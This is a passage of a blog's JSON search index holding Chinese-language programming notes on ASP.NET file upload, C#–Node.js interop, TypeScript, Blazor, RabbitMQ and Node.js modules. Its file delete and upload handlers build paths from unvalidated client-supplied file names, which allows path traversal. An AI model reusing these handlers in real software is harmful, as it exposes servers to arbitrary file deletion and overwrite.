\u0026lt;td\u0026gt;@fileName\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34; asp-action=\u0026#34;DeleteFile\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;fileName\u0026#34; value=\u0026#34;@fileName\u0026#34; /\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-danger\u0026#34;\u0026gt;Delete\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; } \u0026lt;/tbody\u0026gt; \u0026lt;/table\u0026gt; } else { \u0026lt;p\u0026gt;No files uploaded yet.\u0026lt;/p\u0026gt; } controller\n[HttpPost] public IActionResult DeleteFile(string fileName) { var uploadFolder = Path.Combine(Directory.GetCurrentDirectory(), \u0026#34;wwwroot\u0026#34;, \u0026#34;img\u0026#34;); var filePath = Path.Combine(uploadFolder, fileName); if (System.IO.File.Exists(filePath)) { System.IO.File.Delete(filePath); } return RedirectToAction(\u0026#34;Files\u0026#34;); } 💿️重命名 string fileName = $\u0026#34;{DateTime.Now:yyyyMMddHHmmssfff}{new Random().Next(1000, 9999)}{fileExtension}\u0026#34;; var filePath = Path.Combine(uploads, fileName); using (var fileStream = new FileStream(filePath, FileMode.Create)) { await file.CopyToAsync(fileStream); } 💽多文件上传 controller\n[ApiController] [Route(\u0026#34;[controller]\u0026#34;)] public class FileUploadController : ControllerBase { private readonly string UploadsDirectory = Path.Combine(Directory.GetCurrentDirectory(), \u0026#34;uploads\u0026#34;); public FileUploadController() { // 创建上传文件夹（如果不存在） if (!Directory.Exists(UploadsDirectory)) { Directory.CreateDirectory(UploadsDirectory); } } [HttpPost] [Route(\u0026#34;upload\u0026#34;)] public async Task\u0026lt;IActionResult\u0026gt; Upload(IFormFile[] files) { if (files == null || files.Length == 0) { return BadRequest(\u0026#34;No files uploaded.\u0026#34;); } foreach (var file in files) { if (file.Length == 0) { return BadRequest($\u0026#34;File {file.FileName} is empty.\u0026#34;); } // 根据文件类型选择上传的文件夹 string uploadFolder = GetUploadFolder(file.FileName); // 重命名文件为指定格式 string fileName = $\u0026#34;{DateTime.Now:yyyyMMddHHmmssfff}_{Guid.NewGuid()}{Path.GetExtension(file.FileName)}\u0026#34;; string filePath = Path.Combine(UploadsDirectory, uploadFolder, fileName); using (var stream = new FileStream(filePath, FileMode.Create)) { await file.CopyToAsync(stream); } // 在这里可以处理上传文件的逻辑，比如保存文件信息到数据库等 } return Ok(\u0026#34;Files uploaded successfully.\u0026#34;); } private string GetUploadFolder(string fileName) { string fileExtension = Path.GetExtension(fileName).ToLower(); switch (fileExtension) { case \u0026#34;.jpg\u0026#34;: case \u0026#34;.png\u0026#34;: return \u0026#34;img\u0026#34;; case \u0026#34;.mp4\u0026#34;: return \u0026#34;vd\u0026#34;; case \u0026#34;.m4a\u0026#34;: return \u0026#34;sound\u0026#34;; case \u0026#34;.rar\u0026#34;: return \u0026#34;file\u0026#34;; default: throw new NotSupportedException($\u0026#34;Unsupported file format for {fileName}.\u0026#34;); } } } view\n@{ ViewBag.Title = \u0026#34;File Upload\u0026#34;; } \u0026lt;h2\u0026gt;File Upload2\u0026lt;/h2\u0026gt; \u0026lt;form id=\u0026#34;uploadForm\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; id=\u0026#34;fileInput\u0026#34; multiple\u0026gt; \u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;Upload\u0026#34; onclick=\u0026#34;uploadFiles()\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div id=\u0026#34;message\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; @section scripts { \u0026lt;script\u0026gt; function uploadFiles() { var files = document.getElementById(\u0026#39;fileInput\u0026#39;).files; if (files.length === 0) { showMessage(\u0026#39;No files selected.\u0026#39;); return; } var formData = new FormData(); for (var i = 0; i \u0026lt; files.length; i++) { formData.append(\u0026#39;files\u0026#39;, files[i]); } $.ajax({ url: \u0026#39;@Url.Action(\u0026#34;Upload\u0026#34;, \u0026#34;FileUpload\u0026#34;)\u0026#39;, type: \u0026#39;POST\u0026#39;, data: formData, processData: false, contentType: false, success: function (response) { showMessage(response); }, error: function (xhr, status, error) { showMessage(\u0026#39;Upload failed: \u0026#39; + error); } }); } function showMessage(message) { $(\u0026#39;#message\u0026#39;).text(message); } \u0026lt;/script\u0026gt; } ","permalink":"https://qfsyso.github.io/posts/.net-fileupload/","summary":"VS2022 .NET8\n💾基础上传示例 view\n@{ ViewData[\u0026#34;Title\u0026#34;] = \u0026#34;File Upload\u0026#34;; } \u0026lt;h1\u0026gt;@ViewData[\u0026#34;Title\u0026#34;]\u0026lt;/h1\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34; action=\u0026#34;/Home/UploadFile\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; class=\u0026#34;form-control\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;Upload\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; controller\n[HttpPost] public async Task\u0026lt;IActionResult\u0026gt; UploadFile() { var file = Request.Form.Files[0]; if (file != null \u0026amp;\u0026amp; file.Length \u0026gt; 0) { var uploads = Path.Combine(Directory.GetCurrentDirectory(), \u0026#34;wwwroot\u0026#34;, \u0026#34;up\u0026#34;); if (!Directory.Exists(uploads)) { Directory.CreateDirectory(uploads); } var filePath = Path.Combine(uploads, file.FileName); using (var fileStream = new FileStream(filePath, FileMode.","title":" .NET FileUpload"},{"content":"在C#中调用Node.js时，一种常见的方法是使用进程间通信（Inter-Process Communication，IPC），例如使用子进程。 可以使用C#中的Process类来启动Node.js进程，并通过标准输入输出与其进行通信。\nC# run nodejs // n.js // 监听来自标准输入的消息 process.stdin.on(\u0026#39;data\u0026#39;, function (data) { // 收到消息后，在控制台输出并回复消息 console.log(\u0026#34;Message from C#: \u0026#34; + data.toString()); process.stdout.write(\u0026#34;Hello from Node.js!\u0026#34;); }); ProcessStartInfo startInfo = new ProcessStartInfo(); startInfo.FileName = \u0026#34;node\u0026#34;; // Node.js可执行文件路径，如果已在系统路径中，则不需要提供完整路径 startInfo.Arguments = \u0026#34;n.js\u0026#34;; // 执行的Node.js脚本文件路径 startInfo.UseShellExecute = false; startInfo.RedirectStandardInput = true; startInfo.RedirectStandardOutput = true; Process nodeProcess = new Process(); nodeProcess.StartInfo = startInfo; // 启动进程 nodeProcess.Start(); // 与Node.js进程进行通信 using (var writer = nodeProcess.StandardInput) { if (writer.BaseStream.CanWrite) { // 向Node.js进程发送消息 writer.WriteLine(\u0026#34;Hello from C#!\u0026#34;); } } // 读取Node.js进程的输出 using (var reader = nodeProcess.StandardOutput) { if (reader.BaseStream.CanRead) { // 从Node.js进程读取响应 string response = reader.ReadLine(); Console.WriteLine(\u0026#34;Response from Node.js: \u0026#34; + response); } } Console.Read(); // 等待Node.js进程结束 nodeProcess.WaitForExit(); nodeProcess.Close(); Socket server const net = require(\u0026#39;net\u0026#39;); // 创建一个服务器实例 const server = net.createServer((socket) =\u0026gt; { // 连接建立时触发 console.log(\u0026#39;Client connected.\u0026#39;); // 监听客户端发送的数据 socket.on(\u0026#39;data\u0026#39;, (data) =\u0026gt; { console.log(\u0026#39;Received from client: \u0026#39; + data.toString()); // 向客户端发送响应数据 socket.write(\u0026#39;Hello from Node.js!\u0026#39; + data.toString()); }); // 监听连接断开事件 socket.on(\u0026#39;end\u0026#39;, () =\u0026gt; { console.log(\u0026#39;Client disconnected.\u0026#39;); }); }); // 监听指定端口 const port = 24520; server.listen(port, () =\u0026gt; { console.log(\u0026#39;Node Server listening on port \u0026#39; + port); }); // 启动 Node.js 服务器的 Node.js 脚本文件路径 string nodeScriptPath = \u0026#34;n.js\u0026#34;; // 启动 Node.js 进程 ProcessStartInfo startInfo = new ProcessStartInfo(); startInfo.FileName = \u0026#34;node\u0026#34;; // Node.js 可执行文件路径，如果已在系统路径中，则不需要提供完整路径 startInfo.Arguments = nodeScriptPath; // Node.js 脚本文件路径 startInfo.UseShellExecute = false; startInfo.RedirectStandardOutput = true; Process nodeProcess = new Process(); nodeProcess.StartInfo = startInfo; // Node.js 服务器输出的事件处理函数 nodeProcess.OutputDataReceived += (sender, e) =\u0026gt; { Console.WriteLine(e.Data); // 输出 Node.js 服务器的输出信息 }; // 启动进程 nodeProcess.Start(); nodeProcess.BeginOutputReadLine(); // 开始异步读取 Node.js 服务器的输出 // 等待 Node.js 进程结束 nodeProcess.WaitForExit(); nodeProcess.Close(); run\nclient // 连接到 Node.js 服务器的地址和端口 string serverAddress = \u0026#34;127.0.0.1\u0026#34;; // 本地地址 int serverPort = 24520; // Node.js 服务器端口 // 创建 TcpClient 实例 using (TcpClient client = new TcpClient(serverAddress, serverPort)) { // 获取用于向服务器发送数据的网络流 using (NetworkStream stream = client.GetStream()) { // 发送数据到服务器 string message = \u0026#34;hi from C#!\u0026#34;; byte[] data = Encoding.ASCII.GetBytes(message); stream.Write(data, 0, data.Length); Console.WriteLine(\u0026#34;Sent: \u0026#34; + message); // 读取服务器的响应 byte[] buffer = new byte[1024]; int bytesRead = stream.Read(buffer, 0, buffer.Length); string response = Encoding.ASCII.GetString(buffer, 0, bytesRead); Console.WriteLine(\u0026#34;Received: \u0026#34; + response); } } run\nnodejs run c# Node.js 使用 child_process.exec() 函数执行 c# exe\nConsole.WriteLine(\u0026#34;hi c# \u0026#34;); //runc.js const { exec } = require(\u0026#39;child_process\u0026#39;); // 执行 hello.exe exec(\u0026#39;ConNode.exe\u0026#39;, (error, stdout, stderr) =\u0026gt; { if (error) { console.error(`执行错误: ${error.message}`); return; } if (stderr) { console.error(`执行错误: ${stderr}`); return; } console.log(`C# 输出: ${stdout}`); }); run\nnode runc.js ","permalink":"https://qfsyso.github.io/posts/c%23-run-nodejs/","summary":"在C#中调用Node.js时，一种常见的方法是使用进程间通信（Inter-Process Communication，IPC），例如使用子进程。 可以使用C#中的Process类来启动Node.js进程，并通过标准输入输出与其进行通信。\nC# run nodejs // n.js // 监听来自标准输入的消息 process.stdin.on(\u0026#39;data\u0026#39;, function (data) { // 收到消息后，在控制台输出并回复消息 console.log(\u0026#34;Message from C#: \u0026#34; + data.toString()); process.stdout.write(\u0026#34;Hello from Node.js!\u0026#34;); }); ProcessStartInfo startInfo = new ProcessStartInfo(); startInfo.FileName = \u0026#34;node\u0026#34;; // Node.js可执行文件路径，如果已在系统路径中，则不需要提供完整路径 startInfo.Arguments = \u0026#34;n.js\u0026#34;; // 执行的Node.js脚本文件路径 startInfo.UseShellExecute = false; startInfo.RedirectStandardInput = true; startInfo.RedirectStandardOutput = true; Process nodeProcess = new Process(); nodeProcess.StartInfo = startInfo; // 启动进程 nodeProcess.Start(); // 与Node.js进程进行通信 using (var writer = nodeProcess.StandardInput) { if (writer.","title":"c# run nodejs"},{"content":"typescript ≈ javascript plus\n🔗setup npm install typescript -g tsc -version npm install ts-node -g 🖌️hello world let str = \u0026#34;hi\u0026#34; console.log(str); ts-node t.ts 🖋️datatype let a1 :string =\u0026#39;abc\u0026#39; let a2:number = 2 let a3 :boolean =true let nu:null =null let un:undefined = undefined let a4:string|null = null let a5:1|2|3 = 2 any let a:any a= 1 a=\u0026#34;1\u0026#34; a=true strong type\nlet a:string = \u0026#34;123\u0026#34; a=1 Err\nlet a:unknown a= 1 a=\u0026#34;1\u0026#34; a=true let b :String if(typeof a ==\u0026#34;string\u0026#34;) { b=a } enum 枚举 enum Color { RED,BLUE,BLACK} let color = Color.BLACK; //Color[2] console.log(color); ts-node t.ts or to js\ntsc t.ts to see t.js\nArray let arr :number[] = [1,2,3] let arr2 :Array\u0026lt;string\u0026gt; = [\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;] 元组 let arr:[String,number,boolean] =[\u0026#34;123\u0026#34;,1,true] let a1 :[number,string,number?] = [1,\u0026#34;11\u0026#34;] 🖊️function function myFn(a:number,b:string,c?:boolean,...rest:number[]) :number { return 100 } const f = myFn(10,\u0026#39;123\u0026#39;,true,1,2,3) ✒️interface interface Obj{ name :string, age:number } const obj:Obj={ name:\u0026#39;a\u0026#39;, age:15 } 📏type let a: String |number = 10 type myname = string |number let b:myname = 10 let b2:myname = \u0026#34;10\u0026#34; 📐T 泛型 function myFn\u0026lt;T\u0026gt;(a:T,b:T):T[]{ return [a,b] } myFn\u0026lt;number\u0026gt;(1,2) myFn(\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;) 📎extends interface Parent{ p1 :string p2:number } interface Child extends Parent { p3:string } const v1 :Child= { p1 :\u0026#34;123\u0026#34;, p2:1, p3:\u0026#34;12\u0026#34; } 🔧class class Article { public title:string con:string temp1?:string tempnum= 100 private temp2 ?:string protected temp3?:string static a1 :string static readonly a2 :string =\u0026#39;a2st\u0026#39; constructor (title:string,con:string) { this.title=title this.con=con } } const a1 =new Article(\u0026#39;t1\u0026#39;,\u0026#39;con1\u0026#39;) class B extends Article { constructor (title:string ,con:string) { super(title,con) this.temp3=\u0026#34;1\u0026#34; } } class User{ private _password :string =\u0026#39;\u0026#39; get password():string{ return \u0026#39;****\u0026#39; } set password (newPass:string) { this._password = newPass } } const u1 = new User() console.log(u1.password) 🪛abstract abstract class Animal{ abstract name:string abstract makeSound():void move():void { console.log(\u0026#39;mmm\u0026#39;) } } class Cat extends Animal{ name:string=\u0026#39;miao\u0026#39; makeSound(): void { console.log(\u0026#34;miaomiao\u0026#34;) } } class Dog extends Animal{ name:string=\u0026#39;wang\u0026#39; makeSound(): void { console.log(\u0026#34;wangwang\u0026#34;) } } 🧲implements interface Animal{ name:string get sound():string makesound():void } interface AgeI{ age:number } class Dog implements Animal,AgeI{ name: string = \u0026#39;wang\u0026#39; age:number = 2 get sound(){ return \u0026#39;\u0026#39; } makesound(): void { } } ","permalink":"https://qfsyso.github.io/posts/typescript-study/","summary":"typescript ≈ javascript plus\n🔗setup npm install typescript -g tsc -version npm install ts-node -g 🖌️hello world let str = \u0026#34;hi\u0026#34; console.log(str); ts-node t.ts 🖋️datatype let a1 :string =\u0026#39;abc\u0026#39; let a2:number = 2 let a3 :boolean =true let nu:null =null let un:undefined = undefined let a4:string|null = null let a5:1|2|3 = 2 any let a:any a= 1 a=\u0026#34;1\u0026#34; a=true strong type\nlet a:string = \u0026#34;123\u0026#34; a=1 Err\nlet a:unknown a= 1 a=\u0026#34;1\u0026#34; a=true let b :String if(typeof a ==\u0026#34;string\u0026#34;) { b=a } enum 枚举 enum Color { RED,BLUE,BLACK} let color = Color.","title":"Typescript study"},{"content":"Blazor 是一个使用 C#、HTML 和 CSS 构建交互式 Web UI 的开源框架，支持服务器端和客户端运行，允许开发者利用 C# 和 .NET 生态来创建 Web 应用。\n🌱Create carete Blazor Web\nProgram.cs 是启动服务器以及在其中配置应用服务和中间件的应用的入口点。 在 Components 目录中:\nApp.razor 为应用的根组件。 Routes.razor 配置 Blazor 路由器。 Pages 目录包含应用的一些示例网页。 BlazorApp.csproj 定义应用项目及其依赖项，且可以通过双击解决方案资源管理器中的 BlazorApp 项目节点进行查看。 Properties 目录中的 launchSettings.json 文件为本地开发环境定义不同的配置文件设置。创建项目时会自动分配端口号并将其保存在此文件上。\n🪴Run pages home.razor\n@page \u0026#34;/\u0026#34; \u0026lt;PageTitle\u0026gt;Home\u0026lt;/PageTitle\u0026gt; \u0026lt;h1\u0026gt;Hello, world m qqqqq\u0026lt;/h1\u0026gt; hihihi 🌴Counter counter.razor\n@page \u0026#34;/counter\u0026#34; @rendermode InteractiveServer \u0026lt;PageTitle\u0026gt;Counter\u0026lt;/PageTitle\u0026gt; \u0026lt;h1\u0026gt;Counter\u0026lt;/h1\u0026gt; \u0026lt;p role=\u0026#34;status\u0026#34;\u0026gt;Current count: @currentCount\u0026lt;/p\u0026gt; \u0026lt;button class=\u0026#34;btn btn-primary\u0026#34; @onclick=\u0026#34;IncrementCount\u0026#34;\u0026gt;Click me\u0026lt;/button\u0026gt; @code { private int currentCount = 0; private void IncrementCount() { currentCount++; } } 像Vue\n🌳Component home \u0026gt; component\n@page \u0026#34;/\u0026#34; \u0026lt;PageTitle\u0026gt;Home\u0026lt;/PageTitle\u0026gt; \u0026lt;h1\u0026gt;Hello, world m qqqqq\u0026lt;/h1\u0026gt; hihihi \u0026lt;Counter /\u0026gt; \u0026lt;Weather\u0026gt; \u0026lt;/Weather\u0026gt; Parameter 修改counter\n@code { private int currentCount = 0; [Parameter] public int IncrementAmount { get; set; } = 1; private void IncrementCount() { // currentCount++; currentCount += IncrementAmount; } } \u0026lt;Counter IncrementAmount=\u0026#34;2\u0026#34; /\u0026gt; 点击即增加2\ndata\n\u0026lt;input @bind=\u0026#34;text\u0026#34; /\u0026gt; \u0026lt;button @onclick=\u0026#34;() =\u0026gt; text = string.Empty\u0026#34;\u0026gt;Clear\u0026lt;/button\u0026gt; \u0026lt;p\u0026gt;@text\u0026lt;/p\u0026gt; @code { string text = \u0026#34;\u0026#34;; } 🌻ToDoList nav Components/Layout/NavMenu.razor\n\u0026lt;div class=\u0026#34;nav-item px-3\u0026#34;\u0026gt; \u0026lt;NavLink class=\u0026#34;nav-link\u0026#34; href=\u0026#34;todo\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;bi bi-list-nested-nav-menu\u0026#34; aria-hidden=\u0026#34;true\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; Todo \u0026lt;/NavLink\u0026gt; \u0026lt;/div\u0026gt; TodoItem public class TodoItem { public string? Title { get; set; } public bool IsDone { get; set; } = false; } AddItem \u0026lt;ul\u0026gt; @foreach (var todo in todos) { \u0026lt;li\u0026gt;@todo.Title\u0026lt;/li\u0026gt; } \u0026lt;/ul\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;input @bind=\u0026#34;newTodo\u0026#34; /\u0026gt; \u0026lt;button @onclick=\u0026#34;AddTodo\u0026#34;\u0026gt;Add todo\u0026lt;/button\u0026gt; @code { private List\u0026lt;TodoItem\u0026gt; todos = new(); string newTodo = \u0026#34;\u0026#34;; void AddTodo() { if (!string.IsNullOrWhiteSpace(newTodo)) { todos.Add(new TodoItem { Title = newTodo }); newTodo = string.Empty; } } } ","permalink":"https://qfsyso.github.io/posts/.net-blazor/","summary":"Blazor 是一个使用 C#、HTML 和 CSS 构建交互式 Web UI 的开源框架，支持服务器端和客户端运行，允许开发者利用 C# 和 .NET 生态来创建 Web 应用。\n🌱Create carete Blazor Web\nProgram.cs 是启动服务器以及在其中配置应用服务和中间件的应用的入口点。 在 Components 目录中:\nApp.razor 为应用的根组件。 Routes.razor 配置 Blazor 路由器。 Pages 目录包含应用的一些示例网页。 BlazorApp.csproj 定义应用项目及其依赖项，且可以通过双击解决方案资源管理器中的 BlazorApp 项目节点进行查看。 Properties 目录中的 launchSettings.json 文件为本地开发环境定义不同的配置文件设置。创建项目时会自动分配端口号并将其保存在此文件上。\n🪴Run pages home.razor\n@page \u0026#34;/\u0026#34; \u0026lt;PageTitle\u0026gt;Home\u0026lt;/PageTitle\u0026gt; \u0026lt;h1\u0026gt;Hello, world m qqqqq\u0026lt;/h1\u0026gt; hihihi 🌴Counter counter.razor\n@page \u0026#34;/counter\u0026#34; @rendermode InteractiveServer \u0026lt;PageTitle\u0026gt;Counter\u0026lt;/PageTitle\u0026gt; \u0026lt;h1\u0026gt;Counter\u0026lt;/h1\u0026gt; \u0026lt;p role=\u0026#34;status\u0026#34;\u0026gt;Current count: @currentCount\u0026lt;/p\u0026gt; \u0026lt;button class=\u0026#34;btn btn-primary\u0026#34; @onclick=\u0026#34;IncrementCount\u0026#34;\u0026gt;Click me\u0026lt;/button\u0026gt; @code { private int currentCount = 0; private void IncrementCount() { currentCount++; } } 像Vue","title":".NET Blazor"},{"content":"setup rabbitmq docker run \u0026ndash;name=rabbit -p 15672:15672 -p 5672:5672 -e RABBITMQ_DEFAULT_USER=admin -e RABBITMQ_DEFAULT_PASS=xxx -d rabbitmq:management\nip:15672\nnuget RabbitMQ.Client\nSend\n//1.1.实例化连接工厂 var factory = new ConnectionFactory() { HostName = \u0026#34;localhost\u0026#34; }; //2. 建立连接 using (var connection = factory.CreateConnection()) { //3. 创建信道 using (var channel = connection.CreateModel()) { //4. 申明队列 channel.QueueDeclare(queue: \u0026#34;hello\u0026#34;, durable: false, exclusive: false, autoDelete: false, arguments: null); //5. 构建byte消息数据包 string message = args.Length \u0026gt; 0 ? args[0] : \u0026#34;Hello RabbitMQ!\u0026#34;; var body = Encoding.UTF8.GetBytes(message); //6. 发送数据包 channel.BasicPublish(exchange: \u0026#34;\u0026#34;, routingKey: \u0026#34;hello\u0026#34;, basicProperties: null, body: body); Console.WriteLine(\u0026#34; [x] Sent {0}\u0026#34;, message); } } Received\n//1.实例化连接工厂 var factory = new ConnectionFactory() { HostName = \u0026#34;localhost\u0026#34; }; //2. 建立连接 using (var connection = factory.CreateConnection()) { //3. 创建信道 using (var channel = connection.CreateModel()) { //4. 申明队列 channel.QueueDeclare(queue: \u0026#34;hello\u0026#34;, durable: false, exclusive: false, autoDelete: false, arguments: null); //5. 构造消费者实例 var consumer = new EventingBasicConsumer(channel); //6. 绑定消息接收后的事件委托 consumer.Received += (model, ea) =\u0026gt; { var message = Encoding.UTF8.GetString(ea.Body.ToArray()); Console.WriteLine(\u0026#34; [x] Received {0}\u0026#34;, message); Thread.Sleep(6000);//模拟耗时 Console.WriteLine(\u0026#34; [x] Done\u0026#34;); }; //7. 启动消费者 channel.BasicConsume(queue: \u0026#34;hello\u0026#34;, autoAck: true, consumer: consumer); Console.WriteLine(\u0026#34; Press [enter] to exit.\u0026#34;); Console.ReadLine(); } } Err RabbitMQ.Client.Exceptions.BrokerUnreachableException:“None of the specified endpoints were reachable” IP host\nErr AuthenticationFailureException: ACCESS_REFUSED - Login was refused using authentication mechanism\nnew ConnectionFactory() { HostName = \u0026#34;localhost\u0026#34; ,UserName=\u0026#34;admin\u0026#34;,Password=\u0026#34;xxx\u0026#34;} 消息持久化\n//... //4. 申明队列(指定durable:true,告知rabbitmq对消息进行持久化) channel.QueueDeclare(queue: \u0026#34;hellooo\u0026#34;, durable: true, exclusive: false, autoDelete: false, arguments: null); //将消息标记为持久性 - 将IBasicProperties.SetPersistent设置为true var properties = channel.CreateBasicProperties(); properties.Persistent = true; //5. 构建byte消息数据包 string message = args.Length \u0026gt; 0 ? args[0] : \u0026#34;Hello RabbitMQ!\u0026#34;; var body = Encoding.UTF8.GetBytes(message); //6. 发送数据包(指定basicProperties) channel.BasicPublish(exchange: \u0026#34;\u0026#34;, routingKey: \u0026#34;hello\u0026#34;, basicProperties: properties, body: body); //6. 发送数据包 channel.BasicPublish(exchange: \u0026#34;\u0026#34;, routingKey: \u0026#34;hello\u0026#34;, basicProperties: null, body: body); Console.WriteLine(\u0026#34; [x] Sent {0}\u0026#34;, message); durable: true\n","permalink":"https://qfsyso.github.io/posts/.net-rabbitmq-note/","summary":"setup rabbitmq docker run \u0026ndash;name=rabbit -p 15672:15672 -p 5672:5672 -e RABBITMQ_DEFAULT_USER=admin -e RABBITMQ_DEFAULT_PASS=xxx -d rabbitmq:management\nip:15672\nnuget RabbitMQ.Client\nSend\n//1.1.实例化连接工厂 var factory = new ConnectionFactory() { HostName = \u0026#34;localhost\u0026#34; }; //2. 建立连接 using (var connection = factory.CreateConnection()) { //3. 创建信道 using (var channel = connection.CreateModel()) { //4. 申明队列 channel.QueueDeclare(queue: \u0026#34;hello\u0026#34;, durable: false, exclusive: false, autoDelete: false, arguments: null); //5. 构建byte消息数据包 string message = args.Length \u0026gt; 0 ? args[0] : \u0026#34;Hello RabbitMQ!","title":".NET RabbitMQ NOTE"},{"content":"📘 util util const util = require(\u0026#39;util\u0026#39;); util.isArray([]) util.isRegExp(/some regexp/) util.isDate(new Date()) // true util.isDate(Date()) // false (without \u0026#39;new\u0026#39; returns a String) os var os = require(\u0026#34;os\u0026#34;); // CPU 的字节序 console.log(\u0026#39;endianness : \u0026#39; + os.endianness()); // 操作系统名 console.log(\u0026#39;type : \u0026#39; + os.type()); // 操作系统名 console.log(\u0026#39;platform : \u0026#39; + os.platform()); // 系统内存总量 console.log(\u0026#39;total memory : \u0026#39; + os.totalmem() + \u0026#34; bytes.\u0026#34;); // 操作系统空闲内存量 console.log(\u0026#39;free memory : \u0026#39; + os.freemem() + \u0026#34; bytes.\u0026#34;); path // 格式化路径 console.log(\u0026#39;normalization : \u0026#39; + path.normalize(\u0026#39;/test/test1//2slashes/1slash/tab/..\u0026#39;)); // 连接路径 console.log(\u0026#39;joint path : \u0026#39; + path.join(\u0026#39;/test\u0026#39;, \u0026#39;test1\u0026#39;, \u0026#39;2slashes/1slash\u0026#39;, \u0026#39;tab\u0026#39;, \u0026#39;..\u0026#39;)); // 转换为绝对路径 console.log(\u0026#39;resolve : \u0026#39; + path.resolve(\u0026#39;main.js\u0026#39;)); // 路径中文件的后缀名 console.log(\u0026#39;ext name : \u0026#39; + path.extname(\u0026#39;main.js\u0026#39;)); net //client var net = require(\u0026#39;net\u0026#39;); var client = net.connect({port: 6001}, function() { console.log(\u0026#39;连接到服务器！\u0026#39;); }); client.on(\u0026#39;data\u0026#39;, function(data) { console.log(data.toString()); client.end(); }); client.on(\u0026#39;end\u0026#39;, function() { console.log(\u0026#39;断开与服务器的连接\u0026#39;); }); //server var net = require(\u0026#39;net\u0026#39;); var server = net.createServer(function(connection) { console.log(\u0026#39;client connected\u0026#39;); connection.on(\u0026#39;end\u0026#39;, function() { console.log(\u0026#39;客户端关闭连接\u0026#39;); }); connection.write(\u0026#39;Hello World!\\r\\n\u0026#39;); connection.pipe(connection); }); server.listen(8080, function() { console.log(\u0026#39;server is listening\u0026#39;); }); dns var dns = require(\u0026#39;dns\u0026#39;); dns.lookup(\u0026#39;www.qq.com\u0026#39;, function onLookup(err, address, family) { console.log(\u0026#39;ip 地址:\u0026#39;, address); dns.reverse(address, function (err, hostnames) { console.log(\u0026#39;反向解析 \u0026#39; + address + \u0026#39;: \u0026#39; + JSON.stringify(hostnames)); }); }); 📕file //read var fs = require(\u0026#39;fs\u0026#39;); fs.stat(\u0026#39;E:/vue/nodejs/hello.js\u0026#39;, function (err, stats) { console.log(stats.isFile()); //true }) var fs = require(\u0026#34;fs\u0026#34;); // 异步读取 fs.readFile(\u0026#39;input.txt\u0026#39;, function (err, data) { if (err) { return console.error(err); } console.log(\u0026#34;异步读取: \u0026#34; + data.toString()); }); // 同步读取 var data = fs.readFileSync(\u0026#39;input.txt\u0026#39;); console.log(\u0026#34;同步读取: \u0026#34; + data.toString()); console.log(\u0026#34;程序执行完毕。\u0026#34;); //write var fs = require(\u0026#34;fs\u0026#34;); fs.writeFile(\u0026#39;x.txt\u0026#39;, \u0026#39;fs.writeFile 写入文件的内容\u0026#39;, function(err) { if (err) { return console.error(err); } console.log(\u0026#34;写入成功！\u0026#34;); fs.readFile(\u0026#39;x.txt\u0026#39;, function (err, data) { if (err) { return console.error(err); } console.log(\u0026#34;异步读取文件数据: \u0026#34; + data.toString()); }); }); 📗Get/Post var http = require(\u0026#39;http\u0026#39;); var url = require(\u0026#39;url\u0026#39;); var util = require(\u0026#39;util\u0026#39;); http.createServer(function(req, res){ res.writeHead(200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain; charset=utf-8\u0026#39;}); res.end(util.inspect(url.parse(req.url, true))); }).listen(3000); http://localhost:3000/?name=mqm\u0026amp;url=www Url { protocol: null, slashes: null, auth: null, host: null, port: null, hostname: null, hash: null, search: \u0026lsquo;?name=mqm\u0026amp;url=www\u0026rsquo;, query: [Object: null prototype] { name: \u0026lsquo;mqm\u0026rsquo;, url: \u0026lsquo;www\u0026rsquo; }, pathname: \u0026lsquo;/\u0026rsquo;, path: \u0026lsquo;/?name=mqm\u0026amp;url=www\u0026rsquo;, href: \u0026lsquo;/?name=mqm\u0026amp;url=www\u0026rsquo; }\n//post\tvar http = require(\u0026#39;http\u0026#39;); var querystring = require(\u0026#39;querystring\u0026#39;); var postHTML = \u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt;\u0026lt;title\u0026gt;POST\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u0026#39; + \u0026#39;\u0026lt;body\u0026gt;\u0026#39; + \u0026#39;\u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt;\u0026#39; + \u0026#39;NAME: \u0026lt;input name=\u0026#34;name\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026#39; + \u0026#39;URL： \u0026lt;input name=\u0026#34;url\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026#39; + \u0026#39;\u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt;\u0026#39; + \u0026#39;\u0026lt;/form\u0026gt;\u0026#39; + \u0026#39;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39;; http.createServer(function (req, res) { var body = \u0026#34;\u0026#34;; req.on(\u0026#39;data\u0026#39;, function (chunk) { body += chunk; }); req.on(\u0026#39;end\u0026#39;, function () { // 解析参数 body = querystring.parse(body); // 设置响应头部信息及编码 res.writeHead(200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/html; charset=utf8\u0026#39;}); if(body.name \u0026amp;\u0026amp; body.url) { // 